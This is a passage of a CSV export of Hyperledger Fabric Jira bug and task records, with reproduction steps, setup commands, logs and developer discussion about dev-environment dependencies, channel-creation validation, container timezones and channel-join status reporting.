gyp ERR! node-gyp -v v3.4.0
gyp ERR! not ok

{code}",Ubuntu 16.04,latitiah,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy71j:",,,,,,,,,,,,,,,,,,,,,,,latitiah,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Jul/17 4:36 AM;latitiah;https://www.digitalocean.com/community/tutorials/what-s-new-in-ubuntu-16-04

Python 3.5 is the default on Ubuntu 16.04. This is a complaint among many pythonistas using 16.04. We should just add a prerequisite to install python. 
{code}
sudo apt-get install python
{code}
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
docker-compose does not work in the documented development environment,FAB-5204,19010,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ynamiki,ynamiki,ynamiki,07/Jul/17 1:23 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Sep/17 6:57 PM,v1.0.0,,,v1.1.0,,fabric-docs,,,,,,0,,,,,,,"I have set up a development environment by following [the document|http://hyperledger-fabric.readthedocs.io/en/latest/dev-setup/devenv.html] (revision 5a66dd38) with a newly-created Amazon EC2 instance with image ""Ubuntu Server 16.04 LTS (HVM), SSD Volume Type - ami-785c491f"".

After executing the pip commands in the document, docker-compose does not work.

{code}
$ sudo apt update
$ sudo apt -y install python-pip
$ pip --version
pip 8.1.1 from /usr/lib/python2.7/dist-packages (python 2.7)
$ sudo apt -y install libssl-dev # for cryptography

$ sudo pip install --upgrade pip
$ pip --version
pip 9.0.1 from /usr/local/lib/python2.7/dist-packages (python 2.7)

$ sudo pip install behave nose docker-compose
...
Successfully installed PyYAML-3.12 backports.ssl-match-hostname-3.5.0.1 behave-1.2.5 cached-property-1.3.0 colorama-0.3.9 docker-2.4.2 docker-compose-1.14.0 docker-pycreds-0.2.1 dockerpty-0.4.1 docopt-0.6.2 enum34-1.1.6 functools32-3.2.3.post2 ipaddress-1.0.18 jsonschema-2.6.0 nose-1.3.7 parse-1.8.2 parse-type-0.3.4 requests-2.11.1 six-1.10.0 texttable-0.8.8 websocket-client-0.44.0
$ docker-compose version
docker-compose version 1.14.0, build c7bdf9e
docker-py version: 2.4.2
CPython version: 2.7.12
OpenSSL version: OpenSSL 1.0.2g  1 Mar 2016

$ # Install requests==2.4.3 according to the document
$ sudo pip install -I flask==0.10.1 python-dateutil==2.2 pytz==2014.3 pyyaml==3.10 couchdb==1.0 flask-cors==2.0.1 requests==2.4.3 pyOpenSSL==16.2.0 pysha3==1.0b1 grpcio==1.0.4
...
Successfully installed Jinja2-2.9.6 MarkupSafe-1.0 Werkzeug-0.12.2 asn1crypto-0.22.0 cffi-1.10.0 couchdb-1.0 cryptography-1.9 enum34-1.1.6 flask-0.10.1 flask-cors-2.0.1 futures-3.1.1 grpcio-1.0.4 idna-2.5 ipaddress-1.0.18 itsdangerous-0.24 protobuf-3.3.0 pyOpenSSL-16.2.0 pycparser-2.18 pysha3-1.0b1 python-dateutil-2.2 pytz-2014.3 pyyaml-3.12 requests-2.11.1 setuptools-36.0.1 six-1.10.0

$ sudo pip install urllib3 ndg-httpsclient pyasn1 ecdsa python-slugify grpcio-tools jinja2 b3j0f.aop six
...
Successfully installed Unidecode-0.4.21 b3j0f.aop-0.8.4 b3j0f.utils-1.4.4 ecdsa-0.13 grpcio-1.4.0 grpcio-tools-1.4.0 ndg-httpsclient-0.4.2 ordereddict-1.1 pyasn1-0.2.3 python-slugify-1.2.4 urllib3-1.21.1
$ docker-compose version
Traceback (most recent call last):
  File ""/usr/local/bin/docker-compose"", line 7, in <module>
    from compose.cli.main import main
  File ""/usr/local/lib/python2.7/dist-packages/compose/cli/main.py"", line 17, in <module>
    from . import errors
  File ""/usr/local/lib/python2.7/dist-packages/compose/cli/errors.py"", line 11, in <module>
    from docker.errors import APIError
  File ""/usr/local/lib/python2.7/dist-packages/docker/__init__.py"", line 2, in <module>
    from .api import APIClient
  File ""/usr/local/lib/python2.7/dist-packages/docker/api/__init__.py"", line 2, in <module>
    from .client import APIClient
  File ""/usr/local/lib/python2.7/dist-packages/docker/api/client.py"", line 6, in <module>
    import requests
  File ""/usr/local/lib/python2.7/dist-packages/requests/__init__.py"", line 53, in <module>
    from .packages.urllib3.contrib import pyopenssl
  File ""/usr/local/lib/python2.7/dist-packages/requests/packages/urllib3/contrib/pyopenssl.py"", line 73, in <module>
    ssl.PROTOCOL_SSLv3: OpenSSL.SSL.SSLv3_METHOD,
AttributeError: 'module' object has no attribute 'PROTOCOL_SSLv3'
{code}

I found that we can fix the issue by upgrading requests.

{code}
$ sudo pip install -U requests
...
Successfully installed certifi-2017.4.17 chardet-3.0.4 requests-2.18.1
$ docker-compose version
docker-compose version 1.14.0, build c7bdf9e
docker-py version: 2.4.2
CPython version: 2.7.12
OpenSSL version: OpenSSL 1.0.2g  1 Mar 2016
{code}

Do we need to stick to requests-2.4.3?

Outputs of pip freeze (before and after upgrading requests) are attached.",,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Jul/17 1:20 PM;ynamiki;pip-freeze-requests-2.18.1.txt;https://jira.hyperledger.org/secure/attachment/11603/pip-freeze-requests-2.18.1.txt","07/Jul/17 1:20 PM;ynamiki;pip-freeze-requests-2.4.3.txt;https://jira.hyperledger.org/secure/attachment/11604/pip-freeze-requests-2.4.3.txt",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy727:",,,,,,,,,,,,,,,,,,,,,,,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Jul/17 5:16 PM;ynamiki;I fixed the issue by installing stand-alone docker-compose (in GitHub Releases page), not by upgrading requests (as described above).

The document is updated in
https://gerrit.hyperledger.org/r/11517

Packages installed after following the document in a fresh Ubuntu 16.04 machine (before running pip, only python-apt==1.1.0b1 has been installed):
{code}
$ pip freeze
asn1crypto==0.22.0
b3j0f.aop==0.8.4
b3j0f.utils==1.4.4
behave==1.2.5
cffi==1.10.0
CouchDB==1.0
cryptography==1.9
ecdsa==0.13
enum34==1.1.6
Flask==0.10.1
Flask-Cors==2.0.1
futures==3.1.1
grpcio==1.4.0
grpcio-tools==1.4.0
idna==2.5
ipaddress==1.0.18
itsdangerous==0.24
Jinja2==2.9.6
MarkupSafe==1.0
ndg-httpsclient==0.4.2
nose==1.3.7
ordereddict==1.1
parse==1.8.2
parse-type==0.3.4
protobuf==3.3.0
pyasn1==0.2.3
pycparser==2.18
pyOpenSSL==16.2.0
pysha3==1.0b1
python-apt==1.1.0b1
python-dateutil==2.2
python-slugify==1.2.4
pytz==2014.3
PyYAML==3.10
requests==2.4.3
six==1.10.0
Unidecode==0.4.21
urllib3==1.21.1
Werkzeug==0.12.2
{code};;;","24/Jul/17 8:37 PM;ynamiki;https://gerrit.hyperledger.org/r/11517;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Creating new channel does not check inconsistency of channel_name and channel_id,FAB-5207,19014,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,jyellick,xixuejia,xixuejia,07/Jul/17 9:07 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Jul/17 3:13 AM,v1.0.0-rc1,,,v1.0.0,,,,,,,,0,orderer,Security,,,,,"Creating new channel with fabric-sdk-node, neither sdk nor orderer would check the inconsistency of [channel_name|https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/create-channel.js#L191] and channel_id(specified in create channel transaction, say mychannel.tx).

If we just change the field [channel_name|https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/create-channel.js#L191] to another name and leave all other fields in request object unchanged, we can create as many channels as we want only if we provide a new channel_name each time. That means orderer does not check uniqueness of txId nor consistency of channel_name and channel_id. This may cause security issues.

While if we create a new channel with cli, peer will check the consistency of channel_name and channel_id and print out error if they do not match. This could prevent the issue to some extent, but a radical solution should do the check by ordering service.
{code:java}
root@029cab82d5fa:/opt/gopath/src/github.com/hyperledger/fabric/peer# peer channel create -c xixue -f channel-artifacts/channel.tx -o orderer.example.com:7050
2017-07-07 03:35:30.963 UTC [msp] GetLocalMSP -> DEBU 001 Returning existing local MSP
2017-07-07 03:35:30.963 UTC [msp] GetDefaultSigningIdentity -> DEBU 002 Obtaining default signing identity
2017-07-07 03:35:30.966 UTC [channelCmd] InitCmdFactory -> INFO 003 Endorser and orderer connections initialized
Error: Invalid channel create transaction : mismatched channel ID mychannel != xixue
{code}",fabric commit level: d4adf7ab29b9e9454d3573f4f6f813689354b73f,jyellick,Ratnakar,xixuejia,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx267:",,,,,,,,,,,,,,,,,,,,,,,jyellick,Ratnakar,xixuejia,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Jul/17 11:34 PM;Ratnakar;[~scottz] and I tested this using node-sdk sample [balance-transfer|https://github.com/hyperledger/fabric-samples/tree/master/balance-transfer] and we could reproduce the issue.

We used the available channel configuration transaction which has chain-id '*mychannel*' , we could create multiple channels and we could join the peers to those channels.;;;","07/Jul/17 11:50 PM;jyellick;I've identified the issue, a fix is pending.;;;","08/Jul/17 12:11 AM;jyellick;In review via: https://gerrit.hyperledger.org/r/#/c/11437/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create release test suite in CI,FAB-5208,19026,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,07/Jul/17 11:59 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Jul/17 9:05 PM,v1.0.0-rc1,,,v1.0.0,,fabric-build,,,,,,0,build-system,,,,,,"cleCreate release test suite in CI to test below tests after release is made on fabric

1) SDK e2e tests

     - Java e2e

     - node e2e

2) make targets

3) byfn tests

   - custom channel

   - default channel

4) ledger tests

5) Auction chaincodes

6) node gulp test",In Jenkins CI,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy74f:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Jul/17 4:42 AM;rameshthoomu;patch has been submitted and in-review;;;","11/Jul/17 9:05 PM;rameshthoomu;Patch has been merged. Closing this task;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Setting of timezone for chaincode container,FAB-5210,19033,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,mastersingh24,rhegde,rhegde,08/Jul/17 12:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Aug/17 8:36 PM,v1.0.0,,,v1.0.2,v1.1.0,fabric-peer,,,,,,0,Release-planning-1.2,,,,,,"Docker container are by default created or launched to use UTC timezone. Peer and Orderer timezone can be controlled by volume mounting to use the host timezone.

    volumes:
       - /etc/localtime:/etc/localtime:ro

Other option can be the docker-environment variable TZ however our understanding this requires package upgrade for both host and docker-image.

Using the volume mount option, we were able to change the timezone of the Peer however whenever the chaincode container is spin-off, this still runs on the UTC timezone.

Use Case: Our system is all configured with the reference data (time component) to a particular timezone (not UTC).",,mastersingh24,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABB-18,FAB-5927,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy79j:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Jul/17 6:00 AM;Clayton Sims;Mihir can you comment on this.  Or  [~muralisr]   ?

 ;;;","21/Jul/17 6:31 PM;mastersingh24;I don't think that we want to be mounting volumes for the chaincode container.

[~rhegde] Any reason not to do something like :

{code}
os.Setenv(""TZ"", ""America/New_York"")
t := time.Now()
fmt.Println(t)
{code}
or 
{code}
tz, _ := time.LoadLocation(""America/New_York"")
t := time.Now().In(tz)
{code}

from within your chaincode?   You could pass the timezone in as part of the init function if you don't want to hardcode it;;;","21/Jul/17 11:41 PM;rhegde;We would prefer to keep the chaincode source aganostic and use the container timezone by using time.local. Forcing timezone in the chaincode is the last option.

The container logs will still print in the UTC timezone?

 ;;;","01/Aug/17 9:03 PM;mastersingh24;If you use 

{code:java}
os.Setenv(""TZ"", ""America/New_York"")
{code}

then it should also work for logging.;;;","27/Aug/17 3:06 AM;mastersingh24;Need to update to fabric-baseimage/baseos v0.3.2 as [https://gerrit.hyperledger.org/r/#/c/12089/] is required for the above comments to work;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
behave test fmwk: should allow empty strings to be passed in query,FAB-5213,19047,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,Nishi,Nishi,08/Jul/17 3:20 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/May/18 12:28 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"Please find attached feature file where it fails currently @ step:
{code:java}
 Then a user receives expected response of{code}
 

 

 ",,jyellick,Nishi,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jul/17 3:20 AM;Nishi;chaincode_example03.feature;https://jira.hyperledger.org/secure/attachment/11607/chaincode_example03.feature",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7bj:",,,,,,,,,,,,,,,,,,,,,,,jyellick,Nishi,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/May/18 2:14 AM;jyellick;My understanding is that the behave framework is being deprecated as we move towards ginkgo, is this still valid? [~scottz];;;","09/May/18 12:27 AM;scottz;We are not deprecating the behave framework in fabric-test repo.

However, this old testcase is invalid. We can close this issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Docker 1.13 should be a requirement,FAB-5216,19089,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,markparz,shimos,shimos,08/Jul/17 6:47 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 2:32 AM,v1.0.0-rc1,,,Future,,fabric-docs,fabric-samples,,,,,0,,,,,,,"The fabcar sample in fabric-samples uses the ""-e"" option for ""docker exec"" as below:
{noformat}
docker exec -e ""CORE_PEER_LOCALMSPID=Org1MSP"" -e ""CORE_PEER_MSPCONFIGPATH=/etc/hyperledger/msp/users/Admin@org1.example.com/msp"" peer0.org1.example.com peer channel create -o orderer.example.com:7050 -c mychannel -f /etc/hyperledger/configtx/mychannel.tx
{noformat}

Since the ""-e"" or ""env"" option is introduced in Docker 1.13, the requirement for Docker explained in the documents should be ""1.13 or greater"" rather than ""1.12 or greater.""
(alternatively, the script should be changed for it to work under Docker 1.12)
","fabric-samples 6899719cbbd4900970469d46e8bbf56f3346333d

fabric 4709b3384bd5b4996673c620afbd7dab256ccbc8",markparz,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABC-553,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7hz:",,,,,,,,,,,,,,,,,,,,,,,markparz,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jul/17 4:13 AM;markparz;CR https://gerrit.hyperledger.org/r/#/c/11883/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE installs only to last org in list,FAB-5217,19090,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,dongming,holocron,holocron,08/Jul/17 12:00 PM,21/Aug/18 10:22 PM,28/Oct/23 3:00 AM,21/Aug/18 10:22 PM,,,,,,fabric-quality,,,,,,0,PTE,,,,,,"When multiple orgs are listed in the user input file, PTE only successfully installs to the last one.",,ChristopherFerris,dongming,holocron,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy7i7:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,dongming,holocron,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jul/17 4:04 AM;dongming;PTE only installs chaincode on one org at a time. Hence use can only specify one org per user input json file.  However, one runCase input can contain multiple user input json.  So user can still install multiple org in one execution.;;;","12/Jul/17 4:30 AM;holocron;Okay – the difficulty here is in that some times PTE will let you specify multiple orgs, and sometimes not... this should be made more clear.;;;","12/Jul/17 6:02 AM;dongming;updated README in v1performance to address that what can be applied to multiple org and what cannot:

*transType*: transaction type
   Channel: channel activities specified in channelOpt.action, multiple org is not permitted on channelOpt:orgName
   Install: install chaincode, multiple org is not permitted on channelOpt:orgName
   Instantiate: instantiate chaincode on the organizations listed in the orgName of channelOpt, multiple org is permitted on channelOpt:orgName
   Invoke: invokes transaction, multiple org is permitted on channelOpt:orgName
   
   notes that in case of multiple org is not permitted, user can specify multiple user input json files in runCases.txt that the desired action (install etc) can be performed on multiple org.

 ;;;","10/Jul/18 3:06 AM;ChristopherFerris;[~dongming] is this done?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CLI peer does not correctly report status of a join request,FAB-5218,19091,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,aambati,yuki-kon,yuki-kon,08/Jul/17 12:24 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Nov/17 7:12 AM,v1.0.0-rc1,,,Future,,fabric-peer,,,,,,0,,,,,,,"Based on fabric/example/e2e_cli ([https://github.com/hyperledger/fabric/blob/master/examples/e2e_cli/end-to-end.rst])
 - Add a new organization ""org3"".
 - Add a new peer ""peer0.org3.example.com""
 - Add key/certs for ""peer0.org3.example.com"".
 - Genesis block / mychannel.tx is NOT modified. The members of ""mychannel"" are ""org1"" and ""org2"" (Not org3).

In this situation, we expect that org3 cannot join ""mychannel"" because org3 is not a member of ""mychannel"".
 However, peer command got success message after org3.admin executes ""peer join"" with existing block.
 The following are detailed procedure. Log file of orderer and peer0.org3.example.com are attached.

Steps to reproduce 
 --------------------------
 1. Generate crypto materials and genesis block.
{noformat}
 $ cd $FABRIC/examples/e2e_cli
 $ ./generateArtifacts.sh
{noformat}

2. start blockchain network
{noformat}
 $ docker-compose -f docker-compose-cli.yaml up -d
{noformat}

3. Log in cli container
{noformat}
 $ docker exec -it cli bash
{noformat}

4. Create channel by org1.Admin
{noformat}
 $ export CHANNEL_NAME=mychannel
 $ export CORE_PEER_TLS_ENABLED=true
 $ export ORDERER_CA=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem
 $ peer channel create -o orderer.example.com:7050 -c $CHANNEL_NAME -f ./channel-artifacts/channel.tx --tls $CORE_PEER_TLS_ENABLED --cafile $ORDERER_CA
{noformat}

5. Join Channel by org3.Admin
{noformat}
 $ CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp CORE_PEER_ADDRESS=peer0.org3.example.com:7051 CORE_PEER_LOCALMSPID=""Org3MSP"" CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org3.example.com/peers/peer0.org3.example.com/tls/ca.crt peer channel join -b mychannel.block
{noformat}

Expected Results
 --------------------------
 Peer command gets error message because the joining request by org3.Admin was rejected. 
 Artifacts about mychannel should not be created.

Actual Results
 -------------------------
 Peer command ends successfully. The following messages were returned.
{noformat}
2017-07-08 00:50:43.168 UTC [msp] GetLocalMSP -> DEBU 001 Returning existing local MSP
2017-07-08 00:50:43.168 UTC [msp] GetDefaultSigningIdentity -> DEBU 002 Obtaining default signing identity
2017-07-08 00:50:43.175 UTC [channelCmd] InitCmdFactory -> INFO 003 Endorser and orderer connections initialized
2017-07-08 00:50:43.177 UTC [msp/identity] Sign -> DEBU 004 Sign: plaintext: 0A85070A5B08011A0B08E3D880CB0510...142E4A305B5B1A080A000A000A000A00
2017-07-08 00:50:43.177 UTC [msp/identity] Sign -> DEBU 005 Sign: digest: 9F4D9680243E7EAB53DBDD6BBA381D3D845C2194A65C928725AADE161346F098
2017-07-08 00:50:43.278 UTC [channelCmd] executeJoin -> INFO 006 Peer joined the channel!
2017-07-08 00:50:43.279 UTC [main] main -> INFO 007 Exiting.....
{noformat}
Artifacts about mychannel was created. Blockfile of sub-ledger is on the peer0.org3.example.com.
{noformat}
$ docker exec -it peer0.org3.example.com bash
$ ls /var/hyperledger/production/ledgersData/chains/chains/mychannel
/var/hyperledger/production/ledgersData/chains/chains/mychannel/blockfile_000000
{noformat}
After joining, peer executed deliver command. However, deliver command was rejected because org3 was not ChannelReader of mychannel.",,binhn,C0rWin,Hangyu_FJH,jeffgarratt,muralisr,weeds,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jul/17 12:20 PM;yuki-kon;crypto-config.yaml;https://jira.hyperledger.org/secure/attachment/11612/crypto-config.yaml","08/Jul/17 12:21 PM;yuki-kon;docker-compose-base.yaml;https://jira.hyperledger.org/secure/attachment/11611/docker-compose-base.yaml","08/Jul/17 12:21 PM;yuki-kon;docker-compose-cli.yaml;https://jira.hyperledger.org/secure/attachment/11610/docker-compose-cli.yaml","08/Jul/17 12:21 PM;yuki-kon;orderer.log;https://jira.hyperledger.org/secure/attachment/11609/orderer.log","08/Jul/17 12:21 PM;yuki-kon;peer0.org3.log;https://jira.hyperledger.org/secure/attachment/11608/peer0.org3.log",,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7if:",,,,,,,,,,,,,,,,,,,,,,,binhn,C0rWin,Hangyu_FJH,jeffgarratt,muralisr,weeds,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jul/17 12:43 AM;binhn;[~yuki-kon]

This is work-as-designed: since peer0.org3 is under the control of org3.admin, the admin can instruct peer0 to join the channel (in reality, org3.admin would not have access to the channel artifact to do this anyway; only collusion would get here). At this point, the peer doesn't have the channel and so can't initialize the channel access control, so the access control requirement at this point is that the requester must be the local admin (org3.admin), which is the case here. Therefore the peer is successfully set up to join the channel <<== this is important point: since joining a channel is an async request, it requires a request to the orderer for org3, so the peer returns successful on preparation, but eventually fails on joining the channel due to membership enforcement.;;;","09/Jul/17 2:39 AM;yuki-kon;[~binhn] Thanks for your comment. I checked the log messages of peer0.org3 and understood that joining channel request fails eventually. I'm afraid this might be an usability problem. How does admin.org3 know that joining peer fails after all? Does Fabric have a command to know the list of channels which a peer joins?;;;","09/Jul/17 7:06 PM;C0rWin;There is an API for CSCC to list all channels peer has joined **GetChannels**, you can see how it works with {{peer cli}} 

{code}
peer channel list
{code};;;","09/Jul/17 11:15 PM;binhn;[~yuki-kon]  admin.org3 is a malicious attacker trying to get into a channel that his org3 doesn't belong, would we care about usability for attackers?

Look, the channel was created without org3, so org3 would not have access to the channel artifact to begin with. But somehow (collusion) org3 got a hold of this channel artifact, and the admin didn't bother to check to see whether his org belong to the channel, so he maliciously instructed his peers to join the channel and obviously failed. 

An honest admin would verify the channel.block for correctness of policies, which orgs in it, etc before instructing the peers to join. 

That is the design, and I think it is sound as-is: protecting channels from attackers and providing no advantage to such attackers.;;;","09/Jul/17 11:40 PM;muralisr;[~binhn] _>so the peer returns successful on preparation, but eventually fails on joining the channel due to membership enforcement_

Right.. the peer only sets up the environment so it can complete join the successfully if permitted. The CLI message should have been something like ""Peer has initiated join"" instead of ""Peer joined the channel!"".

[~yuki-kon]
 Currently peer3 cannot participate in the channel till the join loop is completed. Note that the peer continues to try to join and  continues to get the error

 
{code:java}
^[[36m2017-07-08 22:40:56.135 UTC [deliveryClient] RequestBlocks -> DEBU 672 Starting deliver with block [1] for channel mychannel
 ^[[31m2017-07-08 22:40:56.138 UTC [blocksProvider] DeliverBlocks -> ERRO 673 [mychannel] Got error &{FORBIDDEN}
 
{code}
In future we might be able to send a config update that could add Org3 to the channel and thus let the peer complete the loop.

As [~C0rWin] points out, 
{code:java}
peer chaincode list..
{code}
will get you the list of channels the peer has joined... although in this case this is not particularly useful as it will show ""mychannel"" in the (pending) list. It would have been  useful to indicated the state of the channel (e.g., ""awaiting join"", ""joined"").

Suggest we use this JIRA post 1.0 to tighten up join response
 * clean up the CLI ""Peer joined the channel!"" message (easy)
 * return more accurate state of channel in query command (moderate)

We could also investigate doing some deeper checks before preparing for the channel.

What do you think ?;;;","10/Jul/17 6:29 AM;yuki-kon;[~C0rWin][~binhn][~muralisr] 
Thanks for your reply. I could understand deeply the design of joining peer.
I agree to the Srinivasan's proposal. It will be nice improvements for admin users to know the ""join"" status accurately.;;;","10/Jul/17 9:53 AM;muralisr;[~yuki-kon] thanks. Created two sub tasks. If OK with you, will move this to post 1.0.;;;","10/Jul/17 11:01 AM;yuki-kon;[~muralisr] Thank you for creating sub tasks. I agree to move this to post 1.0. I changed Fix Version/s to v1.0.1. ;;;","10/Jul/17 8:34 PM;weeds;Given the various comments- and that Yuki Kondo (the originator of defect)  agreed to move to post 1.0, I'm moving this to medium level defect. Thanks Yuki- I do think this is something we do absolutely need to consider- very good thoughts here. Really appreciate your diligence on all the evaluation and testing you are doing. It's very helpful .;;;","08/Sep/17 3:32 AM;muralisr;[~yuki-kon] Given the above discussion going to rephrase it as follows ""CLI peer does not correctly report status of a join request"";;;","27/Oct/17 4:22 AM;jeffgarratt;[~muralisr] do you have cycles for this one?;;;","27/Oct/17 5:43 AM;muralisr;[~jeffgarratt] After FAB-5921, I'd like to knock of chaincode FSM cleanup ... long overdue and better done for 1.1. But assign to me if there's no one else to pick this up. I can defintely get the message clean up part which from a usability point of view is a good thing. ;;;","27/Oct/17 5:46 AM;C0rWin;I think we need to be careful here, since we need to keep in mind that we might be adding a new peer of new organization which was just added into the channel and hence doesn't present in the `genesis.block`. ;;;","27/Oct/17 5:50 AM;muralisr;[~C0rWin] can you expand on that a bit please ? Which aspect of the fix do we need to be careful about ?;;;","27/Oct/17 5:57 AM;C0rWin;[~muralisr] as far as I understand the problem, or at least my interpretation of it. Peer from org3 gets genesis block while org3 is not part of the channel, however genesis.block is accepted and parsed, delivery service initiated to connect to the ordering service to pull the blocks, while eventually fails as org3 not channel readers. Therefore I'd assume that possible fix would to explore block before accepting it and initializing delivery service, providing correct error message.

My concerns is related to the scenario where you will be joining a new peer of org3, which wasn't channel reader when channel was created, but added at later stages.;;;","02/Nov/17 5:05 AM;muralisr;From CLI's point of view, the ""join"" request is asynchronous. So the CLI side cannot predict the outcome of the join. The tasks outlined do NOT suggest we modify the CLI to do such checks to find out the outcome of the join. 

Task - *post join processing to reflect accurate status of the join command*
this was opened to track status of join on the peer side when the join command was completed to make sure the right reasons for the failure are reported. ie, basically a usability issue. On second thoughts though, suggest we don't pursue this 
* existing logs between peer and orderer would already cover some ground
* it could cause more confusion than provide clarity (e.g., a delayed inflight config update tx might have made it work)

Task - *Peer should check whether belongs to a channel before creating ledger* 
